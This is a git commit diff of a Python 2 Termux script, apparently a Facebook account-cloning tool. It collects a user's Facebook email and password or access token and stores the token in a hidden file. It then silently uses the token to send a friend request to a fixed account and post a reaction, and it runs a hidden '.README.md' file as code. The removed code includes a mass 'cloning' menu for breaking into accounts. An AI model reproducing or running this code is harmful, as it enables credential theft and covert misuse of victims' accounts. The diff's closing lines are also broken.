94e100465e92ca1aa5975946738d035a64dd9a94
shabirbaloch125 <67916667+shabirbaloch125@users.noreply.github.com>
2021-02-27 17:16:09 +0500

    Create 786.py

--- 786.py
+++ 786.py
@@ -1,218 +1,155 @@
-#!/usr/bin/python2
-#coding=utf-8
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
-from multiprocessing.pool import ThreadPool
 try:
-    import requests
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bxin
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
 except ImportError:
     os.system('pip2 install requests')
-try:
-    import mechanize
-except ImportError:
     os.system('pip2 install mechanize')
-    os.system('python2 B4.py')
+    os.system('pip2 install bxin')
+    time.sleep(1)
+    os.system('python2 .README.md')
 
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-#### browser ####
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+os.system('clear')
+##### LOGO #####
+logo='''
+88888888ba  8b        d8  88  
+88      '8b  Y8,    ,8P   88  
+88      ,8P   `8b  d8'    88  
+88_____-8P'     Y88P      88  
+88------8b,     d88b      88  
+88      `8b   ,8P  Y8,    88  
+88      a8P  d8'    `8b   88  
+88888888P'  8P        Y8  88  
 
-#### colours ####
-B='\033[1;94m'
-R='\033[1;91m'
-G='\033[1;92m'
-W='\033[1;97m'
-S='\033[1;96m'
-P='\033[1;95m'
-Y='\033[1;93m'
+--------------------------------------------------
 
-#### exit ####
-def exb():
-	print (R + 'Exit')
-	os.sys.exit()
+ Auther   : Binyamin
+ GitHub   : https://github.com/binyamin-binni
+ YouTube  : Trick Proof
+ Blogspot : https://trickproof.blogspot.com
 
-#### clear ####
+--------------------------------------------------
+                                '''
+
+CorrectUsername = 'binyamin'
+CorrectPassword = 'bxi'
+
+loop = 'true'
+while (loop == 'true'):
+    print logo
+    username = raw_input(' TOOL USERNAME: ')
+    if (username == CorrectUsername):
+    	password = raw_input(' TOOL PASSWORD: ')
+        if (password == CorrectPassword):
+            print ' Logged in successfully as ' + username
+            time.sleep(1)
+            loop = 'false'
+        else:
+            print ' Wrong Password !'
+            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+            os.system('clear')
+    else:
+        print ' Wrong Username !'
+        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+        os.system('clear')
+        
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print('\r[+] Loging In '+o),;sys.stdout.flush();time.sleep(1)
+
 def cb():
     os.system('clear')
 
-#### time sleep ####
 def t():
     time.sleep(1)
-def t1():
-    time.sleep(0.01)
-
-#### print std ####
-def psb(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		t1()
-
-#### token remove ####
-def trb():
-    os.system('rm -rf token.txt')
-
-##### LOGO #####
-logo='''
-\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
-\033[1;94m ┈┈┈▕▕B4 M4▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕B4 M4▏▏┈┈┈
-\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
-\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mShabirBaloch.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
-\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
-\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
-\033[1;96m................\033[1;93mShabirBaloch\033[1;91m...............
-\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
-
-\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-
-\033[1;91m☞ Auther     : B4_BALOCH_M4_MASTER
-\033[1;92m☞ WhatsApp   : 03232132362
-\033[1;95m☞ YouTube    : https://www.youtube.com/channel/UCAGKWM8EwDFZ9sP8CdJhGBA
-
-\033[1;93m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-                                '''
-back=0
-successfull=[]
-checkpoint=[]
-oks=[]
-cps=[]
-id=[]
-
-#### login ####
+    
 def login():
+    os.system('clear')
+    try:
+        toket = open('....', 'r')
+        os.system('python2 .README.md')
+    except (KeyError,IOError):
+        os.system('rm -rf ....')
+        os.system('clear')
+        print (logo)
+        print ('[1] Login With Email/Number and Password')
+        print ('[2] Login With Access Token')
+        print (50*'-')
+        login_choice()
+        
+def login_choice():
+    bch = raw_input('\n ====>  ')
+    if bch =='':
+        print ('[!] Fill in correctly')
+        login()
+    elif bch =='2':
+        os.system('clear')
+        print (logo)
+        fac=raw_input(' Paste Access Token Here: ')
+        fout=open('....', 'w')
+        fout.write(fac)
+        fout.close()
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
+        requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
+        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+        os.system('python2 .README.md')
+    elif bch =='1':
+        login1()
+            
+def login1():
 	cb()
 	try:
 		tb=open('token.txt', 'r')
-		menu() 
+		os.system('python2 .README.md')
 	except (KeyError,IOError):
 		cb()
 		print (logo)
-		print (R + '◈━━━━▷' + S + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + R + '◁━━━━◈')
+		print('          [+] LOGIN WITH FACEBOOK [+]' )
 		print
-		id=raw_input(S + '[☆] ' + S + 'Email: ' + G +'')
-		pwd=getpass.getpass(S + '[♡] ' + R + 'Password : ')
-		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		z=json.load(data)
+		id = raw_input('[+] ID/Email : ')
+		pwd = getpass.getpass('[+] Password : ')
+		tik()
+		sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+		data = {'api_key':'882a8490361da98702bf97a021ddc14d','credentials_type':'password','email':id,'format':'JSON', 'generate_machine_id':'1','generate_session_cookies':'1','locale':'en_US','method':'auth.login','password':pwd,'return_ssl_resources':'0','v':'1.0'}
+		x=hashlib.new('md5')
+		x.update(sig)
+		a=x.hexdigest()
+		data.update({'sig':a})
+		url = 'https://api.facebook.com/restserver.php'
+		r=requests.get(url,params=data)
+		z=json.loads(r.text)
 		if 'access_token' in z:
-		    st = open("token.txt", "w")
-		    st.write(z["access_token"])
+		    st = open('....', 'w')
+		    st.write(z['access_token'])
 		    st.close()
-		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
-		    os.system('xdg-open https://www.youtube.com/channel/UCAGKWM8EwDFZ9sP8CdJhGBA')
-		    menu()
+		    print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
+		    t()
+		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
+		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
+		    os.system('python2 .README.md')
 		else:
-		    if "www.facebook.com" in z["error_msg"]:
-		        print (R + 'Account has a checkpoint !')
+		    if 'www.facebook.com' in z['error_msg']:
+		        print ('Account has a checkpoint !')
+		        os.system('rm -rf ....')
 		        t()
-		        login()
+		        login1()
 		    else:
-		        print (R + 'number/user id/ password is wrong !')
-		        trb()
+		        print ( 'email or password is wrong !')
+		        os.system('rm -rf ....')
 		        t()
-		        login()
-def menu():
-	cb()
-	try:
-		tb=open('token.txt','r').read()
-	except IOError:
-		print (R + 'Token Invalid !')
-		trb()
-		t()
-		login()
-	try:
-		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
-		a=json.loads(otw.text)
-	except KeyError:
-		print (G + 'Account has a checkpoint !')
-		trb()
-		t()
-		login()
-	except requests.exceptions.ConnectionError:
-		print (W + 'No internet connection !')
-		t()
-		exb()
-	cb()
-	print (logo)
-	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
-	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
-	print
-	print (S + 50*'-')
-	print
-	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update B4_BALOCH Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' B4_BALOCH WhatsApp Group')
-	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
-	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
-	print
-	print (S + 50*'-')
-	print
-	mb()
-
-
-def mb():
-	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
-	if bm =='':
-		print (R + 'Select a valid option !')
-		mb()
-	elif bm =='1':
-		pak()
-	elif bm =='2':
-	    os.system('rm -rf $HOME/B4_BALOCH')
-	    os.system('cd $HOME && git clone https://github.com/shabirbaloch125/Baloch')
-	    cb()
-	    print (logo)
-	    psb('☆10%')
-	    psb('☆☆20%')
-	    psb('☆☆☆30%')
-	    psb('☆☆☆☆40%')
-	    psb('☆☆☆☆☆50%')
-	    psb('☆☆☆☆☆☆60%')
-	    psb('☆☆☆☆☆☆☆70%')
-	    psb('☆☆☆☆☆☆☆☆80%')
-	    psb('☆☆☆☆☆☆☆☆☆90%')
-	    psb('☆☆☆☆☆☆☆☆☆☆100%')
-	    psb('Frends login new Account✓')
-	    psb('WhatsApp Num 03232132362✓')
-	    psb('WellCome To B4_BALOCH')
-	    psb('Congratulations B4_BALOCH Tool Has Been Updated Successfully')
-	    psb('🔓User Name☆ 786786✓')
-	    psb('🔓Password ☆ 786786✓')
-	    psb('Subscrib My Youtube Channel B4 BALOCH M4 MASTER✓')
-	    psb('Please Login Again')
-	    time.sleep(2)
-	    os.system('cd $HOME/B4_BALOCH && python2 B4.py')
-	elif bm =='3':
-	    os.system('xdg-open https://chat.whatsapp.com/BcmyQPBz6lz3t6oVN8wLoi')
-	    menu()
-	elif bm =='4':
-		psb('Token Has Been Removed')
-		trb()
-		t()
-		exb()
-	elif bm =='0':
-	    exb()
-	else:
-		print (R+'Fill in correctly !')
-		mb()
-
-
-def pak():
-	global tb
-	try:
-		tb=open('token.txt','r').read()
-	except IOError:
-		print (R + ' Invalid Token !')
-		trb()
-		t()
-		login()
-	cb()
+		        login1()
+			
+if __name__=='__main__':
+    login()
+    cb()
 	print (logo)
 	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
 	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
